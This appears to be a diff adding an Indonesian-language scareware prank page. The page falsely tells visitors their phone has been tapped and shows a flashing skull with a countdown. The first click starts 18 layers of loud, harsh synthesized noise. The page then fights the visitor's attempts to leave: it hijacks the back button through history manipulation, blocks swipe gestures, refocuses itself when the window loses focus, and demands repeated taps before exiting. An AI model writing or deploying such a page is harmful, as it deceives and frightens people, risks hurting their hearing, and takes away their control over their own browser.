@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>PERINGATAN!</title>
+  <style>
+    :root{--bg:#000;--red:#ff0033;--blood:#8b0000;--white:#fff;}
+    html,body{margin:0;padding:0;height:100%;background:var(--bg);color:var(--white);font-family:"Courier New",monospace;overflow:hidden;touch-action:manipulation;user-select:none;}
+    @keyframes flashBg{0%,100%{background:#000;}50%{background:#330000;}}
+    body.flash{animation:flashBg .05s infinite alternate;}
+    .wrap{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;text-align:center;}
+    
+    /* Animasi ngelag untuk tengkorak */
+    .tengkorak{
+      font-size:150px;
+      position:relative;
+      filter:drop-shadow(0 0 35px var(--red));
+      animation:kelapKelip 120ms infinite alternate,getar 25ms infinite,putar 2s linear infinite,lagEffect 2s infinite;
+      transform-origin:center;
+    }
+    
+    /* Efek ngelag */
+    @keyframes lagEffect{
+      0%{transform:rotate(0deg) scale(1);}
+      10%{transform:rotate(0deg) scale(1);}
+      11%{transform:rotate(180deg) scale(1.2);}
+      12%{transform:rotate(180deg) scale(1.2);}
+      13%{transform:rotate(90deg) scale(0.8);}
+      14%{transform:rotate(90deg) scale(0.8);}
+      15%{transform:rotate(270deg) scale(1.1);}
+      16%{transform:rotate(270deg) scale(1.1);}
+      17%{transform:rotate(0deg) scale(1);}
+      100%{transform:rotate(0deg) scale(1);}
+    }
+    
+    /* Efek glitch pada tengkorak */
+    .tengkorak::before,
+    .tengkorak::after{
+      content:'💀';
+      position:absolute;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      font-size:150px;
+    }
+    
+    .tengkorak::before{
+      animation:glitchRed 3s infinite;
+      clip-path:polygon(0 0, 100% 0, 100% 45%, 0 45%);
+      transform:translateX(-2px);
+    }
+    
+    .tengkorak::after{
+      animation:glitchBlue 3s infinite;
+      clip-path:polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
+      transform:translateX(2px);
+    }
+    
+    @keyframes glitchRed{
+      0%,90%,100%{opacity:0;}
+      91%,99%{opacity:1;color:#ff0040;}
+    }
+    
+    @keyframes glitchBlue{
+      0%,85%,100%{opacity:0;}
+      86%,99%{opacity:1;color:#0040ff;}
+    }
+    
+    .pesan{font-size:32px;padding:12px 18px;display:none;}
+    .p1{color:var(--red);text-shadow:0 0 25px var(--red);}
+    .p2{color:var(--white);font-weight:700;text-shadow:0 0 15px rgba(255,255,255,.4);}
+    #countdown{font-size:60px;color:var(--red);font-weight:700;text-shadow:0 0 50px var(--red);}
+    @keyframes kelapKelip{0%{filter:drop-shadow(0 0 25px var(--red)) brightness(1);}100%{filter:drop-shadow(0 0 45px var(--blood)) brightness(1.4);}}
+    @keyframes getar{0%{transform:translateX(-7px) rotate(-4deg);}25%{transform:translateX(7px) rotate(4deg);}50%{transform:translateX(-7px) rotate(-4deg);}75%{transform:translateX(7px) rotate(4deg);}100%{transform:translateX(0) rotate(0);}}
+    @keyframes putar{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
+
+    /* Overlay untuk menghalangi tombol kembali */
+    .back-button-blocker{
+      position:fixed;
+      bottom:0;
+      left:0;
+      width:100%;
+      height:80px;
+      background:linear-gradient(to top, rgba(0,0,0,0.9) 0%, transparent 100%);
+      z-index:9999;
+      pointer-events:auto;
+    }
+
+    /* Area konfirmasi kembali yang sulit dijangkau */
+    .exit-confirm{
+      position:fixed;
+      bottom:10px;
+      left:50%;
+      transform:translateX(-50%);
+      background:#1a1a1a;
+      border:2px solid #ff0033;
+      border-radius:5px;
+      padding:5px 10px;
+      font-size:12px;
+      color:#ff0033;
+      opacity:0;
+      transition:opacity 0.3s;
+      z-index:10000;
+    }
+
+    .exit-confirm.show{
+      opacity:1;
+    }
+
+    /* Membuat scroll tidak berfungsi */
+    body{
+      overscroll-behavior:none;
+      -webkit-overflow-scrolling:touch;
+    }
+
+    /* Efek freeze pada layar */
+    .freeze-effect{
+      position:fixed;
+      top:0;
+      left:0;
+      width:100%;
+      height:100%;
+      background:rgba(255,0,0,0.1);
+      pointer-events:none;
+      z-index:9998;
+      animation:freeze 0.5s infinite;
+    }
+
+    @keyframes freeze{
+      0%,100%{opacity:0.1;}
+      50%{opacity:0.3;}
+    }
+  </style>
+</head>
+<body class="flash">
+  <div class="freeze-effect"></div>
+  <div class="back-button-blocker" id="blocker"></div>
+  <div class="exit-confirm" id="exitConfirm">
+    Tekan tahan di sini 3 detik untuk keluar
+  </div>
+  
+  <div class="wrap">
+    <div class="tengkorak">💀</div>
+    <div id="peringatan" class="pesan p1">⚠️ HP ANDA TELAH DISADAP ⚠️</div>
+    <div id="lanjutan" class="pesan p2">HP ANDA TIDAK AMAN LAGI!</div>
+    <div id="countdown">60</div>
+  </div>
+
+  <script>
+    let audioCtx,masterGain;
+    let s=60;
+    const el=document.getElementById('countdown');
+    let exitTimer = null;
+    let exitStartTime = 0;
+
+    function initAudio(){
+      if(!audioCtx){
+        audioCtx=new(window.AudioContext||window.webkitAudioContext)();
+        masterGain=audioCtx.createGain(); masterGain.gain.value=1; masterGain.connect(audioCtx.destination);
+      }
+      if(audioCtx.state==='suspended') audioCtx.resume();
+    }
+
+    /* ---------- 18 LAYER SUARA (sama seperti sebelumnya) ---------- */
+    function startAllAudio(){
+      initAudio();
+
+      /* 1. Triple rumble */
+      [55,57,59].forEach(f=>{
+        const o=audioCtx.createOscillator(); o.type='sine'; o.frequency.value=f;
+        const g=audioCtx.createGain(); g.gain.value=0.8;
+        o.connect(g).connect(masterGain); o.start();
+        const l=audioCtx.createOscillator(); l.type='sine'; l.frequency.value=1.8;
+        const lg=audioCtx.createGain(); lg.gain.value=35;
+        l.connect(lg); lg.connect(o.frequency); l.start();
+      });
+
+      /* 2. Hyper-sirene 35 Hz */
+      const s=audioCtx.createOscillator(); s.type='sawtooth'; s.frequency.value=1300;
+      const sg=audioCtx.createGain(); sg.gain.value=0.45;
+      s.connect(sg).connect(masterGain); s.start();
+      const sl=audioCtx.createOscillator(); sl.type='triangle'; sl.frequency.value=35;
+      const slg=audioCtx.createGain(); slg.gain.value=900;
+      sl.connect(slg); slg.connect(s.frequency); sl.start();
+
+      /* 3. Screech 30-70 ms */
+      function screech(){
+        const o=audioCtx.createOscillator(); o.type='sawtooth'; o.frequency.value=1000+Math.random()*1500;
+        const g=audioCtx.createGain(); const n=audioCtx.currentTime;
+        g.gain.setValueAtTime(0,n); g.gain.linearRampToValueAtTime(1.8,n+0.002);
+        g.gain.linearRampToValueAtTime(0,n+0.03+Math.random()*0.04);
+        o.connect(g).connect(masterGain); o.start(); o.stop(n+0.1);
+        setTimeout(screech,30+Math.random()*70);
+      }
+      screech();
+
+      /* 4. Noise burst 0.8 s */
+      function noise(){
+        const bs=audioCtx.sampleRate*0.3;
+        const b=audioCtx.createBuffer(1,bs,audioCtx.sampleRate);
+        const d=b.getChannelData(0);
+        for(let i=0;i<bs;i++) d[i]=Math.random()*2-1;
+        const src=audioCtx.createBufferSource(); src.buffer=b;
+        const g=audioCtx.createGain(); g.gain.value=0.7;
+        src.connect(g).connect(masterGain); src.start();
+        setTimeout(noise,800);
+      }
+      noise();
+
+      /* 5. Beep detik + pitch naik tiap 6 detik */
+      let pitch=1700;
+      function beep(){
+        const o=audioCtx.createOscillator(); o.type='square'; o.frequency.value=pitch;
+        const g=audioCtx.createGain(); const n=audioCtx.currentTime;
+        g.gain.setValueAtTime(0,n); g.gain.linearRampToValueAtTime(0.7,n+0.003);
+        g.gain.exponentialRampToValueAtTime(0.0001,n+0.05);
+        o.connect(g).connect(masterGain); o.start(); o.stop(n+0.06);
+        if((60-s)%6===0) pitch+=150;
+      }
+
+      /* 6. Sub-boom 2.5 s */
+      function boom(){
+        const o=audioCtx.createOscillator(); o.type='sine'; o.frequency.value=32;
+        const g=audioCtx.createGain(); const n=audioCtx.currentTime;
+        g.gain.setValueAtTime(0,n); g.gain.linearRampToValueAtTime(1.3,n+0.01);
+        g.gain.exponentialRampToValueAtTime(0.0001,n+0.6);
+        o.connect(g).connect(masterGain); o.start(); o.stop(n+0.6);
+        setTimeout(boom,2500);
+      }
+      boom();
+
+      /* 7. Click super-rapid 20-50 ms */
+      function click(){
+        const o=audioCtx.createOscillator(); o.type='square'; o.frequency.value=2500+Math.random()*2000;
+        const g=audioCtx.createGain(); const n=audioCtx.currentTime;
+        g.gain.setValueAtTime(0,n); g.gain.linearRampToValueAtTime(0.3,n+0.001);
+        g.gain.exponentialRampToValueAtTime(0.0001,n+0.012);
+        o.connect(g).connect(masterGain); o.start(); o.stop(n+0.02);
+        setTimeout(click,20+Math.random()*50);
+      }
+      click();
+
+      /* 8. Ring modulator */
+      function ring(){
+        const c=audioCtx.createOscillator(); c.type='square'; c.frequency.value=500;
+        const m=audioCtx.createOscillator(); m.type='sine'; m.frequency.value=80+Math.random()*120;
+        const cg=audioCtx.createGain(); cg.gain.value=0.25;
+        const mg=audioCtx.createGain(); mg.gain.value=600;
+        c.connect(cg); m.connect(mg); mg.connect(cg.gain);
+        cg.connect(masterGain);
+        c.start(); m.start();
+        setTimeout(()=>{c.stop();m.stop();},700);
+        setTimeout(ring,800+Math.random()*500);
+      }
+      ring();
+
+      /* 9. Feedback scream */
+      function scream(){
+        const o=audioCtx.createOscillator(); o.type='sawtooth'; o.frequency.value=1800+Math.random()*2200;
+        const g=audioCtx.createGain(); const n=audioCtx.currentTime;
+        g.gain.setValueAtTime(0.0001,n); g.gain.exponentialRampToValueAtTime(1,n+0.01);
+        g.gain.exponentialRampToValueAtTime(0.0001,n+0.18);
+        o.connect(g).connect(masterGain); o.start(); o.stop(n+0.2);
+        setTimeout(scream,250+Math.random()*350);
+      }
+      scream();
+
+      /* 10. Rumble2 ultra-low */
+      const r2=audioCtx.createOscillator(); r2.type='triangle'; r2.frequency.value=28;
+      const r2g=audioCtx.createGain(); r2g.gain.value=1;
+      r2.connect(r2g).connect(masterGain); r2.start();
+      const l2=audioCtx.createOscillator(); l2.type='square'; l2.frequency.value=0.5;
+      const l2g=audioCtx.createGain(); l2g.gain.value=18;
+      l2.connect(l2g); l2g.connect(r2.frequency); l2.start();
+
+      /* 11. Chirp */
+      function chirp(){
+        const o=audioCtx.createOscillator(); o.type='sine';
+        o.frequency.setValueAtTime(900,audioCtx.currentTime);
+        o.frequency.exponentialRampToValueAtTime(4500,audioCtx.currentTime+0.1);
+        const g=audioCtx.createGain(); const n=audioCtx.currentTime;
+        g.gain.setValueAtTime(0,n); g.gain.linearRampToValueAtTime(0.4,n+0.01);
+        g.gain.exponentialRampToValueAtTime(0.0001,n+0.11);
+        o.connect(g).connect(masterGain); o.start(); o.stop(n+0.12);
+        setTimeout(chirp,500+Math.random()*700);
+      }
+      chirp();
+
+      /* 12. Detuned cluster */
+      function cluster(){
+        for(let i=0;i<7;i++){
+          const o=audioCtx.createOscillator(); o.type='square';
+          o.frequency.value=350+i*25+Math.random()*50;
+          const g=audioCtx.createGain(); const n=audioCtx.currentTime;
+          g.gain.setValueAtTime(0,n); g.gain.linearRampToValueAtTime(0.25,n+0.02);
+          g.gain.exponentialRampToValueAtTime(0.0001,n+0.35);
+          o.connect(g).connect(masterGain); o.start(); o.stop(n+0.4);
+        }
+        setTimeout(cluster,1500+Math.random()*1000);
+      }
+      cluster();
+
+      /* 13. Pulse random */
+      function pulse(){
+        const o=audioCtx.createOscillator(); o.type='pulse'; o.frequency.value=Math.random()*600+200;
+        const g=audioCtx.createGain(); const n=audioCtx.currentTime;
+        g.gain.setValueAtTime(0,n); g.gain.linearRampToValueAtTime(0.5,n+0.005);
+        g.gain.exponentialRampToValueAtTime(0.0001,n+0.08);
+        o.connect(g).connect(masterGain); o.start(); o.stop(n+0.1);
+        setTimeout(pulse,100+Math.random()*200);
+      }
+      pulse();
+
+      /* 14. High hiss */
+      function hiss(){
+        const bs=audioCtx.sampleRate*0.15;
+        const b=audioCtx.createBuffer(2,bs,audioCtx.sampleRate);
+        for(let c=0;c<2;c++){
+          const d=b.getChannelData(c);
+          for(let i=0;i<bs;i++) d[i]=(Math.random()*2-1)*0.15;
+        }
+        const src=audioCtx.createBufferSource(); src.buffer=b;
+        const hf=audioCtx.createBiquadFilter(); hf.type='highpass'; hf.frequency.value=6000;
+        const g=audioCtx.createGain(); g.gain.value=0.4;
+        src.connect(hf).connect(g).connect(masterGain); src.start();
+        setTimeout(hiss,1200);
+      }
+      hiss();
+
+      /* 15. FM glitch */
+      function glitch(){
+        const c=audioCtx.createOscillator(); c.type='square'; c.frequency.value=600;
+        const m=audioCtx.createOscillator(); m.type='triangle'; m.frequency.value=Math.random()*400+100;
+        const cg=audioCtx.createGain(); cg.gain.value=0.2;
+        const mg=audioCtx.createGain(); mg.gain.value=600;
+        c.connect(cg); m.connect(mg); mg.connect(c.frequency);
+        cg.connect(masterGain);
+        c.start(); m.start();
+        setTimeout(()=>{c.stop();m.stop();},150);
+        setTimeout(glitch,400+Math.random()*600);
+      }
+      glitch();
+
+      /* 16. Reverse swoosh */
+      function swoosh(){
+        const bs=audioCtx.sampleRate*0.4;
+        const b=audioCtx.createBuffer(1,bs,audioCtx.sampleRate);
+        const d=b.getChannelData(0);
+        for(let i=0;i<bs;i++) d[i]=(Math.random()*2-1)*Math.sin((i/bs)*Math.PI);
+        const src=audioCtx.createBufferSource(); src.buffer=b;
+        const g=audioCtx.createGain(); g.gain.value=0.5;
+        src.playbackRate.setValueAtTime(2,audioCtx.currentTime);
+        src.playbackRate.exponentialRampToValueAtTime(0.3,audioCtx.currentTime+0.4);
+        src.connect(g).connect(masterGain); src.start();
+        setTimeout(swoosh,2000+Math.random()*1500);
+      }
+      swoosh();
+
+      /* 17. Laser zip */
+      function laser(){
+        const o=audioCtx.createOscillator(); o.type='sine';
+        o.frequency.setValueAtTime(5000,audioCtx.currentTime);
+        o.frequency.exponentialRampToValueAtTime(300,audioCtx.currentTime+0.18);
+        const g=audioCtx.createGain(); const n=audioCtx.currentTime;
+        g.gain.setValueAtTime(0,n); g.gain.linearRampToValueAtTime(0.6,n+0.005);
+        g.gain.exponentialRampToValueAtTime(0.0001,n+0.19);
+        o.connect(g).connect(masterGain); o.start(); o.stop(n+0.2);
+        setTimeout(laser,800+Math.random()*1200);
+      }
+      laser();
+
+      /* 18. Countdown visual + beep */
+      function tick(){
+        el.textContent=s;
+        beep();
+        if(s>0){s--; setTimeout(tick,1000);}
+      }
+      tick();
+    }
+
+    /* ---------- MENCEGAH KELUAR DENGAN MUDAH ---------- */
+    
+    // Blokir tombol kembali dengan overlay
+    const blocker = document.getElementById('blocker');
+    const exitConfirm = document.getElementById('exitConfirm');
+    
+    // Counter untuk mengecek berapa kali user mencoba kembali
+    let backAttempts = 0;
+    
+    // Event listener untuk mencegah kembali
+    blocker.addEventListener('click', function(e) {
+      e.preventDefault();
+      backAttempts++;
+      
+      // Tampilkan pesan konfirmasi
+      exitConfirm.classList.add('show');
+      
+      // Sembunyikan pesan setelah 2 detik
+      setTimeout(() => {
+        exitConfirm.classList.remove('show');
+      }, 2000);
+      
+      // Setelah 3 kali percobaan, baru izinkan keluar dengan cara yang sulit
+      if (backAttempts >= 3) {
+        startExitSequence();
+      }
+    });
+    
+    // Fungsi untuk keluar yang sulit
+    function startExitSequence() {
+      exitConfirm.textContent = 'TAP 10X PADA BAGIAN ATAS LAYAR UNTUK KELUAR';
+      exitConfirm.classList.add('show');
+      
+      let tapCount = 0;
+      const requiredTaps = 10;
+      
+      function handleTap(e) {
+        // Cek apakah tap di bagian atas layar (20% dari atas)
+        if (e.clientY < window.innerHeight * 0.2) {
+          tapCount++;
+          exitConfirm.textContent = `TAP ${requiredTaps - tapCount}x LAGI`;
+          
+          if (tapCount >= requiredTaps) {
+            // Izinkan keluar
+            window.removeEventListener('click', handleTap);
+            window.removeEventListener('touchstart', handleTap);
+            exitConfirm.textContent = 'Mengeluarkan...';
+            setTimeout(() => {
+              window.history.back();
+            }, 1000);
+          }
+        }
+      }
+      
+      window.addEventListener('click', handleTap);
+      window.addEventListener('touchstart', handleTap);
+    }
+    
+    // Blokir gesture kembali di mobile
+    let touchStartY = 0;
+    let touchStartX = 0;
+    
+    document.addEventListener('touchstart', function(e) {
+      touchStartY = e.touches[0].clientY;
+      touchStartX = e.touches[0].clientX;
+    }, {passive: true});
+    
+    document.addEventListener('touchmove', function(e) {
+      const touchEndY = e.touches[0].clientY;
+      const touchEndX = e.touches[0].clientX;
+      const deltaY = touchEndY - touchStartY;
+      const deltaX = touchEndX - touchStartX;
+      
+      // Blokir swipe dari kiri (gesture kembali)
+      if (deltaX > 50 && Math.abs(deltaY) < 100) {
+        e.preventDefault();
+      }
+      
+      // Blokir swipe dari bawah (gesture home)
+      if (deltaY > 100 && Math.abs(deltaX) < 50) {
+        e.preventDefault();
+      }
+    }, {passive: false});
+    
+    // Blokir tombol back browser
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+      history.go(1);
+      backAttempts++;
+      exitConfirm.classList.add('show');
+      setTimeout(() => exitConfirm.classList.remove('show'), 2000);
+      
+      if (backAttempts >= 3) {
+        startExitSequence();
+      }
+    };
+    
+    // Fokus pada halaman agar tidak bisa keluar dengan mudah
+    window.addEventListener('blur', function() {
+      setTimeout(() => {
+        window.focus();
+      }, 100);
+    });
+
+    /* ---------- 1x KLIK LANGSUNG MELEDAK ---------- */
+    document.addEventListener('click',()=>{
+      document.getElementById('peringatan').style.display='block';
+      document.getElementById('lanjutan').style.display='block';
+      startAllAudio();
+    },{once:true});
+  </script>
+</body>
+</html>
+
